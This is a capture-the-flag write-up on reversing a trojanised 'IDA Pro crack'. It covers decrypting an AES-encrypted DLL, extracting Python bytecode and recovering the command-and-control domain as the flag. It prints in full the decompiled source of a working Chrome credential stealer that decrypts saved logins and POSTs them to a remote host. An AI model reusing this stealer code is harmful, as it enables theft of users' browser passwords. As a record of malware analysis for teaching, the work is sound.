# IDA Pro Crack

right off we can see that we are given 3 folders

in 2 folder there are same ida.exe files and giving them to virustotal shows us that they are malicious

and we probably need to rev these files only

in the .data section there are some values that some functions xor and and they get converted to stuff like a youtube url and file paths

particularly these are the ones i found

```python
ADVAPI32.DLL
https://youtu.be/1xVJ8M5_z3U?si=3q7ge7vZ62_hS1yK
%s\plugins\capture.dll
%s\plugins\pb
\\%s\idb.bin
%s\picture_decoder.exe
#given by AI might not be exact
```

now this youtube func is sus because usually they are not formatted like that…and it indeed is useful

searching more in the functions we can see that sub_401000 is a function that encrypts some file 

i did not know what file it was but after racking my brains alot i suspected plugins/pb file to be the sus one as the was most prevelent in all functions i think?

i also tried looking into picture_decoder.exe but that was useless

but a big problem was no file such as pb existed and certainly none in the plugins folder

but searching for pb showed that it exists in the loader folder of the file

after asking AI about the function more i got to know the flow of the encryption

the youtube URL is first hashed via sha256

then that 32byte alphanum produced by sha256 is used as the AES-CBC encryption key to encrypt our pb.dll and the IV was likely all 0’s was what i was instructed by the AI lol

so i tried decrypting and it succesfully decrypted

```python
import hashlib
from Crypto.Cipher import AES

input_path = 'pb.dll'
output_path = 'pb_decrypted.dll'

with open(input_path, 'rb') as f:
    ciphertext = f.read()
password = b'https://youtu.be/1xVJ8M5_z3U?si=3q7ge7vZ62_hS1yK'
sha256 = hashlib.sha256(password).digest()
key = sha256[:32]
iv = b'\x00' * 16 
cipher = AES.new(key, AES.MODE_CBC, iv)
padded_plaintext = cipher.decrypt(ciphertext)
pad_len = padded_plaintext[-1]
if 1 <= pad_len <= 16:
    decrypted = padded_plaintext[:-pad_len]
else:
    decrypted = padded_plaintext 
with open(output_path, 'wb') as f:
    f.write(decrypted)

print("[+] Decryption done. Saved as pb_decrypted.dll")

```

this successfully decrypts to a good looking dll

then running in virustotal also alerts for malicious file so probably the right attack vector

now, after running strings on the file we can see some .pyc files are stored in the dll

we extract these .pyc files using pyinstractor and then we can see a steal.pyc which is probably the python bytecode which is responsible for extracting/communicating with the website that we need to find

so running this pyc in an online decoder we get….

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: steal.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import requests

def get_encryption_key():
    path = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Local State')
    with open(path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload).decode(errors='ignore')
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except:
            return ''

def extract_chrome_passwords():
    key = get_encryption_key()
    login_db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Login Data')
    filename = 'Loginvault.db'
    try:
        import shutil
        shutil.copyfile(login_db_path, filename)
        conn = sqlite3.connect(filename)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        results = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if username or encrypted_password:
                pass
            else:
                password = decrypt_password(encrypted_password, key)
                results.append({'url': url, 'username': username, 'password': password})
        else:
            cursor.close()
            conn.close()
            os.remove(filename)
            return results
    except Exception:
        return []

def rc4_decrypt(cipher_hex, password):
    from Crypto.Cipher import ARC4
    cipher = ARC4.new(password.encode())
    ciphertext = bytes.fromhex(cipher_hex)
    return cipher.decrypt(ciphertext)

def send_to_domain(domain, data):
    try:
        requests.post(domain, json=data)
    except:
        return None

def main():
    chrome_data = extract_chrome_passwords()
    rc4_hex = '1f243878940214cc7dac2f2a58d608f03d95a01bc22abf5eee5ca082d163535fcb05bf'
    rc4_pass = 'h726hs8726'
    rc4_plain = rc4_decrypt(rc4_hex, rc4_pass).decode(errors='ignore')
    send_to_domain(rc4_plain, chrome_data)
    print('Success')
if __name__ == '__main__':
    main()
```

everything is basically given in this to decode, the rc4 hex and pass so 

```python
from Crypto.Cipher import ARC4

rc4_hex = '1f243878940214cc7dac2f2a58d608f03d95a01bc22abf5eee5ca082d163535fcb05bf'
rc4_pass = 'h726hs8726'
ciphertext = bytes.fromhex(rc4_hex)
cipher = ARC4.new(rc4_pass.encode())
plaintext = cipher.decrypt(ciphertext)
print(plaintext.decode('utf-8', errors='ignore'))

```

gives us our domain!!

r3vchall726272827.re2.blitzhack.xyz

final flag:- 

```python
Blitz{r3vchall726272827.re2.blitzhack.xyz}
```
